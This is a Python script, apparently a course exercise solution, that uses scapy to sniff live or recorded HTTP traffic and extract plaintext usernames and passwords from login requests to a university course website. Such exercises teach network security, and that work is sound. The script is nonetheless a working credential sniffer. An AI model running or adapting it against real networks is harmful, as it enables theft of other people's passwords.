import scapy.all as S
import urllib.parse as urlparse
from typing import Tuple
import codecs


WEBSITE = 'infosec.cs.tau.ac.il'


def parse_packet(packet) -> Tuple[str]:
    """
    If the given packet is a login request to the course website, return the
    username and password as a tuple => ('123456789', 'opensesame'). Otherwise,
    return None.

    Notes:
    1. You can assume the entire HTTP request fits within one packet, and that
       both the username and password are non-empty for login requests (if any
       of the above assumptions fails, it's OK if you don't extract the
       user/password - but you must still NOT crash).
    2. Filter the course website using the `WEBSITE` constant from above. DO NOT
       use the server IP for the filtering (as our domain may point to different
       IPs later and your code should be reliable).
    3. Make sure you return a tuple, not a list.
    """
    # username and password will always be in the raw section
    if not packet.haslayer(S.Raw):
        return None

    # Extract Host and Referer
    raw_load = packet[S.Raw].load.decode('utf-8').split('\r\n')
    host = ' '
    referer = ' '
    for entry in raw_load:
        if entry.startswith('Host: '):
            host = entry[len('Host: '):]
        if entry.startswith('Referer: '):
            referer = entry[len('Referer: '):]
    
    # A login request to our WEBSITE
    if host == WEBSITE and referer.endswith('login/'):

        # Extract username and password
        parsed = urlparse.parse_qs(raw_load[-1])
        # We assume both username and password are not empty
        if 'username' in parsed and 'password' in parsed:
            username = ''.join(parsed['username'])
            password = ''.join(parsed['password'])

            # Replace \\ with \
            username = codecs.decode(username, 'unicode_escape')
            password = codecs.decode(password, 'unicode_escape')

            return (username,password)

    return None


def packet_filter(packet) -> bool:
    """
    Filter to keep only HTTP traffic (port 80) from any HTTP client to any
    HTTP server (not just the course website). This function should return
    `True` for packets that match the above rule, and `False` for all other
    packets.

    Notes:
    1. We are only keeping HTTP, while dropping HTTPS
    2. Traffic from the server back to the client should not be kept
    """
    # HTTP traffic means that the destination port is 80
    if packet.haslayer(S.TCP) and packet[S.TCP].dport == 80:
            return True
    return False


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args:
        print('Usage: %s [<path/to/recording.pcapng>]' % args[0])

    elif len(args) < 2:
        # Sniff packets and apply our logic.
        S.sniff(lfilter=packet_filter, prn=parse_packet)

    else:
        # Else read the packets from a file and apply the same logic.
        for packet in S.rdpcap(args[1]):
            if packet_filter(packet):
                print(parse_packet(packet))


if __name__ == '__main__':
    import sys
    main(sys.argv)

